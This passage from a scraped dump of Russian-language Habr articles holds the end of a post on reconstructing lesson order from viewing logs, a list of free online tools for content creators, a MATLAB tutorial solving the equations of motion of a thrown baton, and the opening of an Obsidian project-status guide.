слово ""abcedf"" написанное с ошибкой. Разделим его на триграммы или биграммы и далее попробуем исправить опечатку, основываясь на статистике биграмм всех юзеров из лога. Разочарование - мало пользователей, которые смотрели более 60% уроковВариант который сработалГипотеза - даже если есть много пользователей которые смотрели не все уроки, но подавляющее большинство скорее всего смотрели уроки в правильной последовательности. Исключаем тех, кто смотрел часть уроков рандомно т.е. несколько раз за все время. Исключаем тех, кто смотрел только первые N минут видео, возможно это были случайные просмотры или пользователь произвольно выбирал урок или ...Собираем частотность пар, что в последовательности урок А, далее урок В смотрело N юзеров. Урок В далее С - смотрело Y и т.д. Не анализируем пары с минимальной частотностью.Сортируем пары в порядке убывания частотности, проверяем. Увы мах частотность имеют пары уроков этого курса, который был запланирован в данном месяце, а первый курс опять где-то мимо. Предварительный результат следующий:последовательность уроков внутри курса собрать получилосьпоследовательность всех уроков - нет, так как смешиваются уроки разных курсоввыделяем потенциальные группы уроков, которые могут стать курсами, далее нужно понять какой это курсперебирая список, смотрим частотность внутри предварительного результата, сравнивая пары последовательных ID в этом списке (пара = строка n и строка n+1) . Если попадается пара у которой частотность отсутствует или минимальная, то для ID которая была n+1 присваиваем n+2 (опускаем в этом списке ниже). Если частотность выше среднего, оставляем и идем далее, сравнивая ID которая в списке под номером n+1 со строкой n+2 и т.д.  Отталкиваемся от логики, что пользователь который смотрел 2 урок из 1 курса скорее всего будет смотреть далее 3 урок из 1 курса, а не 7 урок из 2 курса, даже если частотности этих ID в списке стоят рядом.Результат - обработано 238710 пар уроков, по данным от 3461 пользователя (на основе лога). Время формирование списка пар ~9 сек, время формирование корректной очереди менее 1.7 сек. В качестве проверки результата был взят лог с частью не поврежденного каталога уроков -100% попадание.Задача поста на Хабре - получить от вас идеи, как вы бы решали эту задачу? ",2024-01-26
"100+ бесплатных онлайн-инструментов для всех, кто работает с контентом: копирайтеров, дизайнеров, SMM-специалистов",6,2,https://habr.com/ru/articles/788834/,"Я работаю редактором, поэтому регулярно вычитываю тексты, придумываю идеи для иллюстраций и участвую в создании видео. В крупных проектах с этим помогают корректоры, дизайнеры и креативщики. Когда же работать приходится без них, здорово выручают онлайн-сервисы. Как оказалось, в интернете есть микросервис почти под любую рутинную задачу. Отдельный кайф в том, что работают такие инструменты прямо в браузере: никакой тебе установки и зоопарка ярлыков на рабочем столе.В статье поделюсь онлайн-сервисами, которыми пользуюсь сам или о которых слышал от коллег и знакомых, — никакой массовки.Ну и куда без блока корыстных целей: на канале Плохое/хорошее регулярно делюсь полезными инструментами и советами для редакторов, маркетологов и пиарщиков. Добро пожаловать!ТекстПроверка правописания и читабельности:Glvrd.ru — сервис подсветит стоп-слова (то, что можно удалить без потери смысла) и проверит текст на соответствие информационному стилю.Turgenev.ashmanov.com — оценит стилистику (бесплатно) и переоптимизированность (за деньги) — показатель, который оценивает риск попадания под санкции поисковиков.Orfogrammka.ru — проверит пунктуацию, грамматику и стилистику на основе машинного обучения. Бесплатно можно обработать ограниченный объём текста, но тарифы бюджетные.Yandex.ru/dev/speller — найдёт орфографические ошибки в русском, украинском или английском тексте. Сервис можно подключить к приложению или сайту по API.Languagetool.org — проверит грамматику, пунктуацию и стилистику текста до 10 000 символов. Поддерживает 30+ языков.Artlebedev.ru/orfograf — подсветит базовые ошибки правописания, но варианты исправления не предложит. Проверяет отдельные тексты или целые веб-страницы.Typograf.ru — поможет подготовить текст к публикации на сайте с точки зрения типографики: убрать двойные пробелы, заменить кавычки, проставить «правильные» тире.Artlebedev.ru/typograf/ — аналогичный сервис по типографике с возможностью выбрать тип кавычек и настроить другие детали.Словари и энциклопедии:Gramota.ru — самый популярный справочник по правописанию. Можно задать свой вопрос о том, как правильно писать слова и предложения.Sinonim.org — большой словарь синонимов и антонимов. Также есть поиск ответов на кроссворды и подбор ассоциаций.Kartaslov.ru — толковый словарь и словарь синонимов. Показывает примеры использования слов и словосочетаний в контексте.Antonymonline.ru — словарь антонимов с поиском и разбивкой по буквам.Antonimov.net — ещё один простенький каталог антонимов с поиском.Sklonili.ru — склонение слов по падежам и числам.Skloneniya.ru — словарь склонений, который ещё и определет начальную форму слова.Numeralonline.ru — склонение имён числительных: вводите число цифрами — получаете разные варианты склонений.Summa-propisyu.ru — сервис выводит сумму прописью. Можно добавить приписку про НДС и валюту.Sokr.ru — словарь сокращений, акронимов, аббревиатур и сложносоставных слов.Slovesa.ru — простенький словарь ассоциаций. Wordassociation.ru — словарь ассоциаций с группировкой по смыслу, значению и даже «психологическому восприятию».Sociation.org/graph/ — сервис показывает ассоциации в виде цветной анимированной паутины. Красиво и полезно: так проще генерировать идеи.Текстовые редакторы:Google.ru/intl/ru/docs/about — один из самых популярных редакторов документов от Гугла. Поддерживает большинство «офисных» функций, есть история версий и режим совместной работы.Docs.yandex.ru — чуть более скромный по функциональности, но вполне достойный аналог от Яндекса. Writer.bighugelabs.com — редактор текста с простеньким интерфейсом и минимальным набором функций. Помогает писать, не отвлекаясь, под приятные звуки печатной машинки.Telegra.ph — анонимная платформа для публикации постов. Написанные статьи можно открывать в режиме Instant View, не покидая приложения.SEO:Text.ru/antiplagiat — самый известный среди сеошников сервис по проверки уникальности текста. В бесплатной версии количество проверок ограничено.Advego.com/antiplagiat — проверка на плагиат, дубликаты, некачественный рерайт, заимствования.Content-watch.ru/text — аналогичный севрис. Будет полезен, когда на предыдущих двух большая очередь текстов.Pr-cy.ru/unique — ещё одна альтернатива для антиплагиата. Можно указать конкретную поисковую систему, есть 5 бесплатных проверок для незарегистрированных.Text.ru/seo — SEO-анализ текста: сервис проверяет на «воду», заспамленность и другие показатели, важные для поисковой оптимизации.Advego.com/text/seo — чуть менее подробный SEO-анализ текста: покажет тошноту, водянистость, плотность ключевых слов.Перевод и конвертация:Translate.yandex.ru — переводчик от Яндекса. Поддерживает 100+ языков, среди которых есть даже эльфийский. Можно надиктовать текст для перевода и прослушать результат.Translate.google.com — переводчик от Гугла, тоже поддерживает 100+ языков. Кроме текста для перевода можно указать URL страницы или загрузить картинку либо документ.Translate.ru — переводчик от создателей некогда популярной программы PROMT. Поддерживает 20+ языков, есть телеграм-бот.Img2txt.com — распознавание текста с картинки или pdf-файла. Поддерживает десятки языков, результат можно сохранить в формате txt, pdf, docx и odf.Any2text.ru — расшифровка (транскрибация) аудио- и видеофайлов на 50+ языках. Бесплатно можно расшифровать первую запись длительностью 15 минут.Teamlogs.ru — расшифровка с разделением на спикеров, настройкой доступов и суммаризацией текста. Длительность бесплатной первой расшифровки — 15 минут.Realspeaker.net — ещё один сервис транскрибации, который бесплатно обрабатывает записи длительностью до 1,5 минуты. Поддерживает 30+ языков.Translit.ru — транслитерация: перевод русских букв в латинские и наоборот.Pr-cy.ru/translit — аналогичный сервис, который дополнительно поддерживает украинский и монгольский языки.Artlebedev.ru/transcriptor — транскрипция иностранных слов. Помогает правильно озвучить места, имена и фамилии, названия предприятий. Поддерживает 10+ языков, среди которых африканский, турецкий, итальянский.Artlebedev.ru/case — конвертация в верхний и нижний регистры отдельных слов и целых предложений.Htmled.it — преобразование отформатированного текста в HTML-код.Автоматизация рутины:Pr-cy.ru/duplicates — сервис удалит строки-дубликаты.Pr-cy.ru/difference — сравнит два текста или фрагмента кода и покажет различия.МультимедиаГрафические редакторы:Canva.com (через VPN) — один из самых популярных сервисов, в котором даже далёкие от дизайна люди могут создавать симпатичные обложки, баннеры, инфографику.Supa.ru — конструктор коротких видеороликов и другого контента для соцсетей. Можно создавать клипы с нуля или использовать тематические шаблоны.Page.smmplanner.io/canvas — редактор контента для соцсетей: обложек, картинок, обоев. Сервис позиционирует себя как аналог Canva.Picture.plus — похожий графический редактор, который позволяет создавать ещё и видеоклипы. На бесплатном тарифе ролики будут с логотипом сервиса.Figma.com — более продвинутый графический редактор. В первую очередь его используют для проектирования сложных интерфейсов, но простенькие обложки и баннеры рисовать тоже удобно. Поддерживает совместную работу, есть море плагинов.Photopea.com — фоторедактор, который называют упрощённой альтернативой Фотошопа. Поддерживает файлы разных форматов, среди них PSD, AI, PDF, FIG, SKETCH.Pixlr.com/ru/express — ещё один упрощённый аналог Фотошопа. Есть каталог с шаблонами баннеров, обложек и другого контента для соцсетей и сайтов.Обработка фото:Erase.bg — удаление фона у изображений. Можно загрузить картинку с устройства или указать URL.Retoucher.online — аналогичный сервис, в котором ещё и генерируется новый презентабельный фон — например, для размещения фотографий товаров на маркетплейсе.Juxtapose.knightlab.com — создание одного изображения из двух в формате до/после. Можно сгенерировать статичную картинку или гифку с анимированным сравнением кадров.Tinypng.com — сжатие картинки почти без потери качества. Сервис поможет сэкономить место на диске и ускорить загрузку сайта. На бесплатном тарифе доступна одновременная загрузка 20 изображений весом до 5 МБ каждое.Convert.io/image-converter — массовая конвертация изображения из одного формата в другой. Сервис поддерживает 20+ форматов.Поиск и генерация изображений:Search.creativecommons.org — поиск по архивам с фотографиями, которые можно использовать, не нарушая авторские права.Stockup.sitebuilderreport.com — аналогичный сервис с более скромной базой источников.Unsplash.com — один из самых популярных фотостоков с качественными изображениями.Flickr.com — фотосток с большой коллекцией фотографий и обязательной регистрацией.Freepik.com — архив фото, векторных изображений, коротких видеороликов. Бесплатно можно скачивать 10 файлов в день.Commons.wikimedia.org — своего рода файлообменник, в котором пользователи делятся фотографиями и картинками на любые темы. При использовании некоторых изображений нужно указывать автора.Fusionbrain.ai — генерация картинок с помощью нейросети Kandinsky.Beta.dreamstudio.ai — браузерная версия заморской нейросети от Stability AI. Бесплатно можно создавать ограниченное количество изображений.Giphy.com — большая база с гифками. Есть поиск и разбивка по категориям, можно загрузить свои гифки.Обработка видео:Online-video-cutter.com/ru/video-editor — простенький видеоредактор с возможностью корректировать временную шкалу, поворачивать кадры на 90 градусов, изменять цвет фона.Clideo.com/ru/video-editor — видеоредактор, с помощью которого можно добавлять в ролики аудио и текст, менять скорость воспроизведения, размещать «картинку в картинке».Online-video-cutter.com — сервис обрежет видео по краям или вырежет фрагмент внутри. Поддерживает разные форматы, среди которых MP4, AVI, 3GP.Clideo.com/ru/cut-video — аналогичный инструмент для обрезки видео с последующей конвертацией в AVI, MP4, VOB, MPG, MOV.Online-video-cutter.com/ru/merge-videos — слияние двух видеороликов в один.Clideo.com/ru/merge-video — склейка нескольких видео и изображений в один клип. Можно редактировать аудиодорожку.Clideo.com/ru/compress-video — сжатие видео с минимальными потерями в качестве.Clideo.com/ru/add-subtitles-to-video — наложение субтитров вручную или с помощью файла SRT.Online-video-cutter.com/ru/screen-recorder — запись экрана прямо в браузере. Есть возможность редактировать записанное видео.Поиск видеороликов:Coverr.co — библиотека бесплатных видеороликов.Videvo.net — коллекция стоковых видеозаписей и анимированных изображений.Cutestockfootage.com — бесплатный видеоролики в HD-качестве.Vidsplay.com — стоковые видеоролики с красивыми пейзажами и съёмками, сделанными с дронов.Дизайн:Getcover.ru — примерка макетов: вы загружаете скриншот, а сервис оборачивает его экранами разных устройств и браузеров.Colorscheme.ru — цветовые круги, которые помогут подобрать сочетающиеся оттенки.Emojio.ru — каталог эмодзи с поиском и разбивкой по категориям.Flaticon.com — огромная база иконок со встроенным редактором. Есть группировка по категориям, событиям и стилю.Wordmark.it — демонстрация шрифтов, которые установлены на вашем устройстве.Fonts.google.com — каталог бесплатных шрифтов с поиском и фильтром: например, можно отобразить только шрифты, которые поддерживают кириллицу.Конвертация:Online-convert.com — универсальный конвертер файлов из одного формата в другой. Поддерживает аудио- и видеоролики, документы, изображения, электронные книги, архивы.Cloudconvert.com — аналогичный сервис, который заявляет, что поддерживает 200+ форматов.Video-converter.com — конвертер видеофайлов в MP4, MOV, 3GP и другие форматы. Можно настраивать разрешение финального клипа.Микс инструментов:123apps.com — большой набор микросервисов для работы с видео-, аудио- и PDF-файлами. Среди возможностей: обрезка, склейка, сжатие, конвертация, редактирование.Clideo.com/ru/tools — инструменты для обработки видео: обрезка и склейка, конвертация, изменение размера и пропорций кадров, редактирование аудиодорожки.Организация работыПланировщики задач:RememberTheMilk.com — поможет не забыть о задачах и сгруппировать их по приоритету, дате, тегам. Базовых функций вполне достаточно, но при желании можно расширить тариф и получить плюшки вроде совместной работы и составных задач. Ticktick.com — лаконичный интерфейс и все возможности, которые должны быть у хорошего планировщика: приоритизация, напоминания, совместный доступ.Todoist.com — помимо прочего, сервис поддерживает плагины. С ними можно серьёзно «тюнинговать» инструмент: например, сделать так, чтобы входящие письма автоматически превращались в задачи.365done.ru — коллекция чек-листов и планеров для отслеживания дел и привычек. Есть возможность создать свой чек-лист в конструкторе.Заметки:Evernote.com — удобное хранилище заметок. Можно создавать страницы с разной структурой (лендинг, таблица, календарь) и форматированием.Google.ru/keep — текстовые, голосовые и фотозаметки. Сервис поддерживает совместное редактирование: например, чтобы вести общий список покупок или дел.Notion.so — заметки в формате документов, календарей, списков дел, баз данных, канбан-досок. Есть совместная работа и интеграция с внешними сервисами.Speechpad.ru — по идее это голосовой блокнот, но по факту инструмент будет полезен для транскрибации. Поддерживает 10+ языков.Концентрация:Pomidorko.ru — таймер поможет фокусироваться по методу Pomodoro, когда работа над задачей разбивается на короткие промежутки времени.Noisli.com — генератор фоновых шумов для работы и отдыха. Доступно больше 20 звуков, которые можно смешивать в разных пропорциях. Например, включите шум дождя с потрескиванием камина и представьте, что вы работаете в уютном кабинете, когда за окном непогода.ДокументыШаблоны:Allo.tochka.com/documents — коллекция с образцами документов для бизнеса (в том числе ИП): отчётность, наём, госзакупки.Secrets.tinkoff.ru/documents — аналогичная база шаблонов для бухгалтерии, отдела кадров, ИП и ООО.Обработка документов:Pdf.io/ru/split — сервис разбивает PDF-файлы на несколько частей или страниц. Можно загрузить документ из устройства или перетащить из облака.Pdf.io/ru/merge — объединяет несколько PDF-файлов в один.Pdf.io/ru/compress/ — сжимает PDF, чтобы документ занимал меньше места на диске.Pdf.io — полный набор инструментов для обработки PDF-файлов: преобразовать формат, установить защиту, изменить ориентацию страниц.Convert.io/document-converter — массовая конвертация документов из одного формата в другой. Сервис поддерживает около 20 форматов.ДругоеАналитика и сбор данных:Wordstat.yandex.ru — статистика поисковых запросов к Яндексу. Пригодится, когда нужно придумать темы для контент-плана, проанализировать спрос, отследить сезонность продукта или услуги.Tgstat.ru/analytics — подробная аналитика телеграм-канала: охваты, подписчики, упоминания, топ публикаций.Onlinetestpad.com — сервис поможет создать тесты, опросы, кроссворды. Поддерживает 15+ типов вопросов, из минусов — на странице с тестом много рекламы.Google.ru/intl/ru/forms/about — формы от Гугла с поддержкой совместной работы и выгрузки в удобном формате. Поможет организовать регистрацию на мероприятие, собрать обратную связь, провести опрос.Forms.yandex.ru — аналогичный и не менее удобный сервис от Яндекса.Визуализация:App.diagrams.net — отрисовка блок-схем, диаграмм, инфографики.Сoggle.it — создание и совместное редактирование так называемых интеллект-карт (или ментальных карт). Помогают упорядочить мысли, отследить связи, развить идею.Onlinehtmleditor.net — сервис показывает, как будет выглядеть исходный HTML-код на сайте.Razmerus.artlebedev.ru — инструмент от Студии Лебедева для визуализации всего, что сложно представить в голове: например, расстояния между объектами или их количества.Всё остальное:Typerun.top — простой клавиатурный тренажёр для обучения навыку слепой печати. Это когда вы печатаете быстро и не глядя на клавиши.Klavogonki.ru — ещё один тренажёр, в котором можно не только научиться слепой печати, но и посоревноваться в скорости с другими пользователями.Clck.ru — сокращатель ссылок от Яндекса.Planetcalc.ru — большая коллекция калькуляторов. Например, на сервисе можно рассчитать количество дней и недель между датами, индекс массы тела, объём цилиндра.Cloud.yandex.ru/services/speechkit — демоверсия синтеза речи от Yandex Cloud. Позволяет воспроизвести текст до 500 символов одним из 15+ голосов. Пригодится для вычитки текстов или озвучки коротких аудио- и видеороликов.Fakedoit.com — имитация переписки в Telegram. Можно настроить имя собеседника, аватарку, уровень заряда, время и другие детали.Fakewhats.com — имитация переписки в WhatsApp, возможности примерно такие же.Статья будет дополняться: расскажите в комментариях о сервисах, которые вы используете в работе и учёбе.",2024-01-26
Дубинка (гиря) подброшенная в воздух. Решение дифференциальных уравнений в MATLAB,5,1,https://habr.com/ru/articles/788982/,"Пример решения системы дифференциальных уравнений (ДУ) в MATLAB адаптивным и не адаптивным методами. В MATLAB встроено множество численных решателей с адаптивным шагом для решения жестких, нежестких и полностью неявных систем. С помощью Symbolic Math Toolbox можно сначала выводить системы ДУ, а затем тут же решать их численными методами.Описание моделиДля примера решим систему ДУ, которая описывает систему из двух масс m1 и m2, которые жестко соединены невесомым стержнем длинной L.Дубинка подбрасывается в воздух и двигается в вертикальной плоскости XY в поле тяжести. Угол θ показан на рисунке, координаты центра масс примем за (x,y).Пусть параметры системы будут следующими:Найдем систему ДУ относительно центра масс в терминах Лагранжевой механикиЗапишем энергию вращения системы:Энергию движения:Потенциальную энергию:J - момент инерции, M - масса дубинки, ω - угловая скорость, g - ускорение свободного падения, h - высота.syms Erot Emov J omega V M U g h T x(t) y(t) theta(t) l % зададим символьные переменные
eqnErot = Erot == 1/2*J*omega^2; % энергия вращения
eqnEmov = Emov == 1/2*M*V^2; % энергия движения
eqnU = U == M*g*h; % потенциальная энергия
eqnV = V == sqrt((diff(x,t))^2+(diff(y,t))^2); % скоростьИз закона сохранения энергии найдем выражение L(t,q,q')eqnT = T == rhs(eqnErot) + rhs(eqnEmov); 
eqnT = subs(eqnT,[omega V],[diff(theta,t) rhs(eqnV)]); % кинетическая энергия
eqnU = subs(eqnU,h,y); % потенциальная энергия
syms L
eqnL = L == T - U;
eqnL = subs(eqnL,[T U],[rhs(eqnT) rhs(eqnU)]) % найдем функцию ЛагранжаНайдем уравнения движения дубинки подставив функцию Лагранжа в выражение (1):eqns = functionalDerivative(-rhs(eqnL),[x y theta]) == [0;0;0] % минимизируем функционал
vars = [x(t); y(t); theta(t)]; % переменныеРешим систему уравненийДля этого уменьшаем порядок системы до первого, переписываем систему в виде M(t,x(t))*x(t)'==F(t,x(t)) составляем пользовательскую функцию и решаем ее с помощью ode45.[newEqs,newVars] = reduceDifferentialOrder(eqns,vars); % найдем эквивалентную систему первого порядка
[Mass,f] = massMatrixForm(newEqs,newVars); % найдем массовую матрицу для системы вида M(t,x(t))*x(t)'==F(t,x(t)) 
mass = odeFunction(Mass, newVars,J,M); % конвертируем массовую матрицу в пользовательскую функцию
func = odeFunction(f,newVars,l,g,M); % запишем пользовательскую функцию для F(t,x(t))
% зададим параметры
init_cond % инициализация начальных условий и параметров
y0est = [x0; y0; theta0; vx0; vy0; omega]; % вектор начальных состояний
tend = 3; % конец промежутка времени
opts = odeset('Mass',@(t,q) mass(t,q,Ixx,Msum)); % настройки решателя
Sol = ode45(@(t,q) func(t,q,l,g,Msum),[0 tend],y0est,opts); % решаем систему численно
step = 0.1; % шаг по времени
t = 0:step:tend; % промежуток времени
X = deval(Sol,t,1); % решение для x(t)
Y = deval(Sol,t,2); % решение для y(t)
Th = deval(Sol,t,3);% решение для theta(t)РезультатыВ результате построим графики движения центра масс (ЦМ) дубинки в пространстве и изменение угла θ от времени.Построим анимациюРешение системы ДУ с помощью не адаптивного решателяИногда при решении систем ДУ решателями с адаптивным шагом возникают ошибки, связанные с достижением решателем слишком маленького шага интегрирования. В такие моменты следует поменять решатель, либо уменьшить точность интегрирования, а если это не помогает, остается только выбрать другой промежуток интегрирования, что приводит к кусочному решению. К сожалению, в пакете MATLAB нет функций численного решения ДУ с фиксированным шагом (есть только в Simulink), по типу метода Руге-Кутты.Для решения ДУ с фиксированным шагом придется самому написать функцию, либо скачать уже готовый скрипт с форума MATLAB, например тут.Продемонстрируем решение системы ДУ в MATLAB с помощью метода Дормана-Принса.Составим и решим систему ДУ относительно координат массы 1 (x1,y1) и массы 2 (x2,y2).  Найдем систему ДУ в формулировках Лагранжевой механики:Запишем выражение для кинетической энергии первой и второй массы:и выражения для потенциальной энергии первой и второй массы:Запишем выражения для скоростей первой и второй массы:Ограничивающее выражение:где l – длинна дубинки.syms E1 E2 U1 U2 M V1 V2 g h1 h2 m1 m2
eqnE1 = E1 == 1/2*m1*V1^2; % кинетическая энергия массы 1
eqnE2 = E2 == 1/2*m2*V2^2; % кинетическая энергия массы 2
eqnU1 = U1 == m1*g*h1; % потенциальная энергия массы 1
eqnU2 = U2 == m2*g*h2; % потенциальная энергия массы 2
syms T U C x1(t) y1(t) x2(t) y2(t) u(t) l
eqnV1 = V1 == sqrt((diff(x1,t))^2+(diff(y1,t))^2); % скорость массы 1
eqnV2 = V2 == sqrt((diff(x2,t))^2+(diff(y2,t))^2); % скорость массы 2
eqnC = C == (m1+m2)*u*((x2-x1)^2+(y2-y1)^2-l^2); % выражение для функции Лагранжа
eqnT = T == rhs(eqnE1) + rhs(eqnE2);
eqnT = subs(eqnT,[V1 V2],[rhs(eqnV1) rhs(eqnV2)]); % итоговая кинетическая энергия системы
eqnU = U == rhs(eqnU1) + rhs(eqnU2);
eqnU = subs(eqnU,[h1 h2],[y1 y2]); % итоговая потенциальная энергия системыНайдем выражение L(t,q,q')syms L
eqnL = L == T - U + C;
eqnL = subs(eqnL,[T U C],[rhs(eqnT) rhs(eqnU) rhs(eqnC)])  % функция ЛагранжаНайдем уравнения движения дубинки подставив функцию Лагранжа в выражение (1):   eqns = functionalDerivative(-rhs(eqnL),[x1 y1 x2 y2]); % минимизируем функционал
eqn5 = (x2-x1)^2 + (y2-y1)^2; % выражение ограничивающее расстояние между массами
eqns = [eqns; eqn5] == [0; 0; 0; 0; l^2] % итоговая система
vars = [x1(t); y1(t); x2(t); y2(t); u(t)]; % переменныеРешим систему уравненийДля решения ДУ очень важно найти правильную пользовательскую функцию, пригодную для выбранного решателя, а также начальные условия.Чтобы составить пользовательскую функцию, произведем следующий алгоритм:[eqnsR,varsR] = reduceDifferentialOrder(eqns,vars); % найдем эквивалентную систему первого порядка
[ODEs,constraints] = reduceDAEToODE(eqnsR,varsR); % конвертируем систему первого порядка в такую систему, чтобы Якобиан был обратным
[massM,f] = massMatrixForm(ODEs,varsR); % найдем массовую матрицу M и систему F, такие чтобы выполнялось условие: M(t,x(t))*x(t)'==F(t,x(t))
Lvars = length(varsR); % сосчитаем количество неизвестных 
F = massM\f; % итоговая функция вида x(t)'== M(t,x(t))/F(t,x(t))
Mode = odeFunction(massM, varsR, m1, m2); % пользовательская функция для массовой матрицы
Fode = odeFunction(F, varsR, g, m1, m2); % пользовательская функция системыПодставим численные значения в пользовательские функции:init_cond % загрузим начальные условия
ODEsNumeric = subs(ODEs); % подставим численные значения в систему первого порядка
constraintsNumeric = subs(constraints); % подставим численные значения в ограничения
Mode = @(t,Y) Mode(t,Y,m1,m2); % пользовательская функция для массовой матрицы с численными значениями
Fode = @(t,Y) Fode(t,Y,g,m1,m2); % пользовательская функция системы с численными значениямиНайдем начальные условия для системы первого порядка:L_CM = (m1*0+m2*l)/Msum; % центр масс дубинки
x01 = 1;        y01 = 1;        % начальное положение массы 1
x02 = x01+l;    y02 = y01;      % начальное положение массы 2 
vx01 = vx0;   vy01 = -omega*L_CM+vy0; % начальная скорость массы 1
vx02 = vx0;   vy02 = omega*(l-L_CM)+vy0; % начальная скорость массы 2
y0est = [x01; y01; x02; y02; 0; vx01; vy01; vx02; vy02]; % вектор начальных значений
yp0est = zeros(Lvars,1); % предположение о начальных значениях производных 
t0 = 0;
opt1 = odeset('Mass', Mode); % настройки поиска начальных условий
[y0, yp0] = decic(ODEsNumeric, varsR, constraintsNumeric, t0,...
                y0est, [1,1,1,0,0,1,1,0,1], yp0est, opt1); % поиск начальных условий и соответствующих производныхЗададим промежуток времени и решим систему решателем с фиксированным шагом ode5 (метод Дормана-Принса)   t = t0:0.01:tend; % промежуток времени
Sol = ode5(Fode,t,y0); % решение
X1 = Sol(:,1); % координаты X массы 1
Y1 = Sol(:,2); % координаты Y массы 1
X2 = Sol(:,3); % координаты X массы 2
Y2 = Sol(:,4); % координаты Y массы 2
Th = unwrap(atan2((Y2-Y1),(X2-X1))); % угол вращения дубинки
X = X1+L_CM*cos(Th); % координата X ЦМ
Y = Y1+L_CM*sin(Th); % координата Y ЦМРезультатыПостроим такие же графики движения центра масс (ЦМ) дубинки в пространстве и изменение угла θ от времени.Построим анимацию   Как видно, решения первой системы ДУ адаптивным решателем ode45 и второй системы ДУ фиксированным ode5, довольно похожи. Значит мы скорее всего не ошиблись в выводе уравнений.Для сравнения решим эту же систему решателем для жестких уравнений ode15s:Fode = odeFunction(f, varsR, g, m1, m2); % пользовательская функция системы
opt2 = odeset(opt1,'InitialSlope',yp0); % настройки решателя
Sol = ode15s(Fode, [t0 tend], y0, opt1); % решениеСравним результаты решения адаптивного ode15s и не адаптивного ode5 решателей, найдем абсолютное значение ошибки между решениями:Как можно видеть на графиках, квадрат ошибки порядка 10^-5, что немного, но особенно выводов тут не сделать. Плюсы и минусы адаптивных и не адаптивных решателей известны.Если ни один адаптивный решатель не справляется с решением задачи, всегда поможет старый добрый метод Рунге-Кутты, главное верно задать пользовательскую функцию, пригодную для решателя.Список источников: Solve Equations of Motion for Baton Thrown into AirСсылка на все файлы",2024-01-26
Система статусов для проектов в Obsidian,3.5,0.5,https://habr.com/ru/articles/789248/,"Статья о том, как внедрить и как продуктивно использовать систему статусов в персональных проектах.Гайд предназначен для пользователей Obsidian. Однако, если вы к таковым не причисляетесь, то можете ознакомиться только с описанием системы статусов. Возможно, что вам сам подход понравится и у вас впоследствии получится адаптировать его в своих инструментах.Структура статьи (оглавление)ВведениеАлгоритм Зонке АренсаДетализация этаповСистема статусовКонкретизация этапов работыСтатусы в контексте проектаSingle-projectНебольшая вспомогательная структураБыстрый способ вставить статусLongform-projectSupercharged links и иконки в плагине LongformКак возвращаться к статусамНелинейность как возможностьДополнительный контекст для задачОсновная цельМелкие дополненияЗаключениеВведениенаверхИзначально я хотел назвать эту статью ""Для любителей Obsidian, проектов и emoji"". Однако, не смотря на то, что это название прям максимально точно и ёмко описывает содержание всей статьи, всё же я решил выбрать более спокойное и сбалансированное название.Вероятно вы уже догадались, что речь будет вестись о проектах и статусах, которые эти проекты будут помогать двигать вперёд. Однако прежде чем мы перейдем к конкретике, я вас сначала помучаю алгоритмом Зонке Аренса, а точнее своей критикой этого алгоритма. Потом я ещё вас помучаю и предложу в качестве альтернативы свой длиннющий алгоритм. И только после этого начнется развитие основной идеи этой статьи.Стоит подчеркнуть, что статья является комплексным решением. Это значит, что почти все части статьи так или иначе взаимосвязаны друг с другом. В связи с этим я предлагаю вам такой план работы:Вы поверхностно читаете всю статью целиком, чтобы уловить все основные идеиДалее вы открываете оглавление статьи и на каждом пункте спрашиваете себя ""Мне это нужно?""Если вам это нужно, то открываете нужную главу, вчитываетесь в неё и внедряете в свою систему что-то новоеЕсли вы на этапе поверхностного чтения не понимаете зачем вам нужны те или иные предложенные в статье вещи или идеи, то простой забей на них. Возможно, мы просто с вами решаем разные проблемыВажно отметить, что система статусов, которую я предложу, подойдет именно для персональной, творческой работы. Увы, но для коллаборации или для проектов с высокой ответственностью, предложенная система скорее всего не принесёт пользы – есть риск, что она даже навредит.Также ещё добавлю, что показать свои боевые проекты я, увы, не могу. Поэтому примеры будут такие, которые вы так или иначе уже могли видеть. В общем не обессудьте за это.Теперь перейдем к основному тексту.Алгоритм Зонке АренсанаверхУ Зонке Аренса есть алгоритм, который по его мнению может помочь в написании каких-то сложных текстов. Приведу алгоритм в оригинальном виде (Как делать полезные заметки. 2.1 Пишем шаг за шагом. Стр. 35):Делайте повседневные заметкиДелайте записи о литературеСоздавайте постоянные заметкиТеперь добавьте новые постоянные заметки в свой ящикРазрабатывайте свои темы и исследовательские проекты снизу вверх внутри системыЧерез некоторое время у вас будет достаточно много идей, чтобы решить, на какую тему писатьПревратите свои заметки в черновикОтредактируйте и вычитайте рукописьАлгоритм хоть и отражает в какой-то степени действительность, однако в моём случае он всё равно не работает.Основная проблема, на мой взгляд, заключается в том, что этот алгоритм слабо отражает нелинейность процесса написания, а также недостаточно точно объясняет, что нужно делать на каждом этапе.Хотя чего это я тут лукавлю. Мне этот алгоритм в принципе не очень нравится. И я даже попытаюсь кратко объяснить почему.Не открывать впечатлительным личностям""Повседневные заметки"" – это наивная идея, что в потоке быта можно бессистемно наловить множество хороших идей, из которых потом якобы получится развить что-то стоящее. Если эту мысль развернуть в контексте программирования, то есть у меня стойкое, кхм, ощущение, что работающий код всё же появляется в процессе написания этого кода, а не в процессе запечатления и накопления якобы ценных, случайных всплесков размышлений о том, какой код является работающим. Возможно, я очень превратно воспринял идею ""fleeting notes"", но в любом случае, как оказалось, я не большой фанат уж совсем бессистемных заметок.Записи о литературе, конвертация их в постоянные заметки и добавление в ""ящик"" – это шаги, которые в рамках цифровых систем делаются как одно связанное действие. Причём такое, которое можно сделать в один присест. Если же вы пользователь аналоговых систем с реальным ящиком для заметок или вам в действительности нужно делать эти шаги как раздельные, то вы просто извращенец.Мысль о разработке проектов снизу-вверх мне тоже не очень нравится. Ибо она подразумевает, что я как-будто бы всегда начинаю с нуля. Я как будто бы не знаю как могут развиваться проекты, я как будто бы не могу накидать заранее предварительную архитектуру своего исследования, я как будто бы не могу смоделировать логику развития своего проекта, я как будто бы не могу сделать парочку другую мысленных экспериментов, чтобы определиться с тем какие примерно шаги в действительности для меня будут полезными и эффективными. В общем по мнению Зонке Аренса я как будто бы изначально ""немощный"" и мне нужно в процессе ""подкачаться"". Если что я в курсе, что в книге есть глава про то, что никто никогда не начинает с нуля, Однако, увы, но она не раскрывает мысль, что я могу изначально иметь более-менее ясное видение того, к чему хочу прийти.Мысль Зонке Аренса о том, что у меня через некоторое время будет достаточно много идей, чтобы решить, на какую тему писать тоже весьма кривая. Эта мысль предполагает, что я будто бы хожу, брожу и делаю заметки по тем или иным источникам, а потом в какой-то неожиданный момент на меня снисходит инсайт и я нахожу себе проблему, которую хочу решить. Также стоит отметить, что эта мысль будто бы исключает ситуации, когда я в рамках базы знаний делаю 